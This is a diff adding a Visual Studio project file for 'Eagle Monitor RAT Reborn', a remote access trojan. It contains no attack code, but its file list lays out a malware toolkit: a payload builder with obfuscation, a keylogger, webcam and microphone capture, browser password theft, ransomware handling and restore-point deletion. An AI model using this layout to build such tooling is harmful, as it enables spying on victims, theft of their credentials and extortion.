@@ -1,0 +1,348 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{76117FFD-C18B-4366-8CE8-0572E7F4FB87}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>Eagle_Monitor_RAT_Reborn</RootNamespace>
+    <AssemblyName>Eagle Monitor RAT Reborn</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+    <NuGetPackageImportStamp>
+    </NuGetPackageImportStamp>
+    <TargetFrameworkProfile />
+    <PublishUrl>publish\</PublishUrl>
+    <Install>true</Install>
+    <InstallFrom>Disk</InstallFrom>
+    <UpdateEnabled>false</UpdateEnabled>
+    <UpdateMode>Foreground</UpdateMode>
+    <UpdateInterval>7</UpdateInterval>
+    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
+    <UpdatePeriodically>false</UpdatePeriodically>
+    <UpdateRequired>false</UpdateRequired>
+    <MapFileExtensions>true</MapFileExtensions>
+    <ApplicationRevision>0</ApplicationRevision>
+    <ApplicationVersion>1.0.0.%2a</ApplicationVersion>
+    <IsWebBootstrapper>false</IsWebBootstrapper>
+    <UseApplicationTrust>false</UseApplicationTrust>
+    <BootstrapperEnabled>true</BootstrapperEnabled>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>none</DebugType>
+    <Optimize>true</Optimize>
+    <AssemblyName>Eagle Monitor RAT Reborn (x32)</AssemblyName>
+    <OutputPath>..\bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <DebugSymbols>false</DebugSymbols>
+    <GenerateSerializationAssemblies>On</GenerateSerializationAssemblies>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|x64'">
+    <DebugSymbols>true</DebugSymbols>
+    <OutputPath>bin\x64\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <DebugType>full</DebugType>
+    <PlatformTarget>x64</PlatformTarget>
+    <LangVersion>7.3</LangVersion>
+    <ErrorReport>prompt</ErrorReport>
+    <Prefer32Bit>true</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Release|x64'">
+    <OutputPath>..\bin\Release\</OutputPath>
+    <AssemblyName>Eagle Monitor RAT Reborn (x64)</AssemblyName>
+    <DefineConstants>TRACE</DefineConstants>
+    <Optimize>true</Optimize>
+    <DebugType>none</DebugType>
+    <PlatformTarget>x64</PlatformTarget>
+    <LangVersion>7.3</LangVersion>
+    <ErrorReport>prompt</ErrorReport>
+    <Prefer32Bit>true</Prefer32Bit>
+    <GenerateSerializationAssemblies>On</GenerateSerializationAssemblies>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>eagle2.ico</ApplicationIcon>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="dnlib">
+      <HintPath>DLLs\dnlib.dll</HintPath>
+    </Reference>
+    <Reference Include="FastColoredTextBox">
+      <HintPath>DLLs\FastColoredTextBox.dll</HintPath>
+    </Reference>
+    <Reference Include="Guna.UI2">
+      <HintPath>DLLs\Guna.UI2.dll</HintPath>
+    </Reference>
+    <Reference Include="Leaf.xNet">
+      <HintPath>DLLs\Leaf.xNet.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.VisualBasic">
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="NAudio">
+      <HintPath>DLLs\NAudio.dll</HintPath>
+    </Reference>
+    <Reference Include="Newtonsoft.Json, Version=13.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6aeed, processorArchitecture=MSIL">
+      <HintPath>..\packages\Newtonsoft.Json.13.0.1\lib\net45\Newtonsoft.Json.dll</HintPath>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System">
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Design">
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="Microsoft.CSharp">
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Drawing">
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Windows.Forms">
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="Vestris.ResourceLib, Version=2.1.0.0, Culture=neutral, processorArchitecture=MSIL">
+      <HintPath>..\packages\Vestris.ResourceLib.2.1.0\lib\net45\Vestris.ResourceLib.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Builder\Obfuscate.cs" />
+    <Compile Include="Builder\StubBuilder.cs" />
+    <Compile Include="Builder\IconInjector.cs" />
+    <Compile Include="Builder\WriteAssemblyInfo.cs" />
+    <Compile Include="Controls\CustomContextMenuStrip.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Controls\FormPattern.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Controls\ClientForm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Controls\ClientForm.Designer.cs">
+      <DependentUpon>ClientForm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Controls\AboutForm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Controls\AboutForm.Designer.cs">
+      <DependentUpon>AboutForm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Controls\Utils.cs" />
+    <Compile Include="Misc\DotNetCodeExecution.cs" />
+    <Compile Include="Misc\Encryption.cs" />
+    <Compile Include="Misc\EncryptionInformation.cs" />
+    <Compile Include="Misc\GitHubAPI.cs" />
+    <Compile Include="Misc\Imports.cs" />
+    <Compile Include="Controls\MainForm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Controls\MainForm.Designer.cs">
+      <DependentUpon>MainForm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Misc\RandomString.cs" />
+    <Compile Include="Misc\Settings.cs" />
+    <Compile Include="Network\ChatHandler.cs" />
+    <Compile Include="Network\ClientHandler.cs" />
+    <Compile Include="Network\KeyloggerHandler.cs" />
+    <Compile Include="Network\PacketHandler.cs" />
+    <Compile Include="Network\RemoteDesktopHandler.cs" />
+    <Compile Include="Network\RemoteMicrophoneHandler.cs" />
+    <Compile Include="Network\RemoteWebCamHandler.cs" />
+    <Compile Include="Network\ServerHandler.cs" />
+    <Compile Include="PacketHandler\Ransomware\RansomareEncryptionConfirmationPacketHandler.cs" />
+    <Compile Include="PacketHandler\Recovery\AutofillPacketHandler.cs" />
+    <Compile Include="PacketHandler\Miscellaneous\ChatPacketHandler.cs" />
+    <Compile Include="PacketHandler\Client\ConnectedPacketHandler.cs" />
+    <Compile Include="PacketHandler\File\DeleteFilePacketHandler.cs" />
+    <Compile Include="PacketHandler\UAC\DeleteRestorePointPacketHandler.cs" />
+    <Compile Include="PacketHandler\File\DisksPacketHandler.cs" />
+    <Compile Include="PacketHandler\File\DownloadFilePacketHandler.cs" />
+    <Compile Include="PacketHandler\File\FileManagerPacketHandler.cs" />
+    <Compile Include="PacketHandler\Recovery\HistoryPacketHandler.cs" />
+    <Compile Include="PacketHandler\Miscellaneous\InformationPacketHandler.cs" />
+    <Compile Include="PacketHandler\Miscellaneous\KeylogOfflinePacketHandler.cs" />
+    <Compile Include="PacketHandler\Miscellaneous\KeylogPacketHandler.cs" />
+    <Compile Include="PacketHandler\Recovery\KeywordsPacketHandler.cs" />
+    <Compile Include="PacketHandler\Recovery\PasswordsPacketHandler.cs" />
+    <Compile Include="PacketHandler\Process\ProcessKillerPacketHandler.cs" />
+    <Compile Include="PacketHandler\Process\ProcessManagerPacketHandler.cs" />
+    <Compile Include="PacketHandler\Audio\RemoteAudioCapturePacketHandler.cs" />
+    <Compile Include="PacketHandler\Audio\RemoteAudioPacketHandler.cs" />
+    <Compile Include="PacketHandler\Webcam\RemoteCameraCapturePacketHandler.cs" />
+    <Compile Include="PacketHandler\Webcam\RemoteCameraPacketHandler.cs" />
+    <Compile Include="PacketHandler\Desktop\RemoteViewerPacketHandler.cs" />
+    <Compile Include="PacketHandler\UAC\RestorePointPacketHandler.cs" />
+    <Compile Include="PacketHandler\Process\ResumeProcessPacketHandler.cs" />
+    <Compile Include="PacketHandler\File\ShortCutFileManagersPacketHandler.cs" />
+    <Compile Include="PacketHandler\Process\SuspendProcessPacketHandler.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Misc\Utils.cs" />
+    <EmbeddedResource Include="Controls\FormPattern.resx">
+      <DependentUpon>FormPattern.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Controls\ClientForm.resx">
+      <DependentUpon>ClientForm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Controls\AboutForm.resx">
+      <DependentUpon>AboutForm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Controls\MainForm.resx">
+      <DependentUpon>MainForm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <None Include="app.config" />
+    <None Include="packages.config" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Logo\eagle2.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="eagle2.ico" />
+    <None Include="Resources\uninstall_programs_32px.png" />
+    <None Include="Resources\icons8_signal.ico" />
+    <None Include="Resources\icons8_Tools.ico" />
+    <None Include="Resources\icons8_categorize.ico" />
+    <None Include="Resources\icons8_new_property.ico" />
+    <None Include="Resources\icons8_advanced_search.ico" />
+    <None Include="Resources\icons8_information_32.png" />
+    <None Include="Resources\icons8_create.ico" />
+    <None Include="Resources\icons8_todo_list.ico" />
+    <None Include="Resources\icons8_lock_file.ico" />
+    <None Include="Resources\icons8_mail.ico" />
+    <None Include="Resources\icons8_schedule_mail.ico" />
+    <None Include="Resources\direction_32px.png" />
+    <None Include="Resources\icons8_private_folder.ico" />
+    <None Include="Resources\icons8_security_document.ico" />
+    <None Include="Resources\icons8_microsoft_admin.ico" />
+    <None Include="Resources\icons8_chat.ico" />
+    <None Include="Resources\icons8_c_plus_plus.ico" />
+    <None Include="Resources\icons8_visual_basic.ico" />
+    <None Include="Resources\icons8_Binary_Code.ico" />
+    <None Include="Resources\icons8_source_code.ico" />
+    <None Include="Resources\send_letter_32px.png" />
+    <None Include="Resources\minus_32px.png" />
+    <None Include="Resources\add_32px.png" />
+    <None Include="Resources\icons8_question_mark.ico" />
+    <None Include="Resources\icons8_information.ico" />
+    <None Include="Resources\icons8_informatics.ico" />
+    <None Include="Resources\icons8_computer_virus.ico" />
+    <None Include="Resources\icons8_keyboard.ico" />
+    <None Include="Resources\file_delete_32px.png" />
+    <None Include="Resources\icons8_control_panel.ico" />
+    <None Include="Resources\control_panel_32px.png" />
+    <None Include="Resources\file_32px.png" />
+    <None Include="Resources\icons8_download.ico" />
+    <None Include="Resources\download_32px.png" />
+    <None Include="Resources\Binary Code_32px.png" />
+    <None Include="Resources\end_32px.png" />
+    <None Include="Resources\resume_button_32px.png" />
+    <None Include="Resources\pause_32px.png" />
+    <None Include="Resources\microphone_32px.png" />
+    <None Include="Resources\save_32px.png" />
+    <None Include="Resources\video_call_32px.png" />
+    <None Include="Resources\icons8_microphone.ico" />
+    <None Include="Resources\icons8_imac.ico" />
+    <None Include="Resources\icons8_video_call.ico" />
+    <None Include="Resources\icons8_index.ico" />
+    <None Include="Resources\icons8_parcel.ico" />
+    <None Include="Resources\icons8_user.ico" />
+    <None Include="Resources\icons8_wrench.ico" />
+    <None Include="Resources\icons8_settings.ico" />
+    <None Include="Resources\icons8_remote_desktop.ico" />
+    <None Include="Resources\remote_desktop_32px.png" />
+    <None Include="Resources\icons8_single_line_text_input.ico" />
+    <None Include="Resources\icons8_single_line_text_input_256.png" />
+    <None Include="Resources\icons8_text_input_form.ico" />
+    <None Include="Resources\single_line_text_input_32px.png" />
+    <None Include="Resources\text_input_form_32px.png" />
+    <None Include="Resources\broken_link_32px.png" />
+    <None Include="Resources\disconnected_32px.png" />
+    <None Include="Resources\login_32px.png" />
+    <None Include="Resources\user_32px.png" />
+    <None Include="Resources\imageres_15.ico" />
+    <None Include="Resources\icons8_system_task.ico" />
+    <None Include="Resources\downloads_folder_32px.png" />
+    <None Include="Resources\documents_folder_32px.png" />
+    <None Include="Resources\folder_32px.png" />
+    <None Include="Resources\pin_32px.png" />
+    <None Include="Resources\back_32px.png" />
+    <None Include="Resources\forward_32px.png" />
+    <None Include="Resources\replay_32px.png" />
+    <None Include="Resources\key_32px.png" />
+    <None Include="Resources\time_machine_32px.png" />
+    <None Include="Resources\icons8_time_machine_256.png" />
+    <None Include="Resources\icons8_key_256.png" />
+    <None Include="Resources\icons8_replay.ico" />
+    <None Include="Resources\icons8_reset.ico" />
+    <None Include="Resources\icons8_reset_256.png" />
+    <None Include="Resources\icons8_back_256.png" />
+    <None Include="Resources\icons8_forward_256.png" />
+    <None Include="Resources\icons8_key.ico" />
+    <None Include="Resources\icons8_time_machine.ico" />
+    <None Include="Resources\icons8_file_explorer.ico" />
+    <None Include="Resources\icons8_database_backup.ico" />
+    <None Include="Resources\icons8_database_backup_256.png" />
+    <None Include="Resources\icons8_file_explorer_256.png" />
+    <None Include="Resources\icons8_data_backup_256.png" />
+    <None Include="Resources\icons8_data_backup.ico" />
+    <None Include="Resources\imageres_4.ico" />
+    <None Include="Resources\github%402x.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <WCFMetadata Include="Connected Services\" />
+  </ItemGroup>
+  <ItemGroup>
+    <ProjectReference Include="..\Utils\PacketLib\PacketLib.csproj">
+      <Project>{81e3752a-0ac1-4eb4-8b5f-81eea8ffb0ff}</Project>
+      <Name>PacketLib</Name>
+    </ProjectReference>
+  </ItemGroup>
+  <ItemGroup>
+    <BootstrapperPackage Include=".NETFramework,Version=v4.8">
+      <Visible>False</Visible>
+      <ProductName>Microsoft .NET Framework 4.8 %28x86 et x64%29</ProductName>
+      <Install>true</Install>
+    </BootstrapperPackage>
+    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.5 SP1</ProductName>
+      <Install>false</Install>
+    </BootstrapperPackage>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
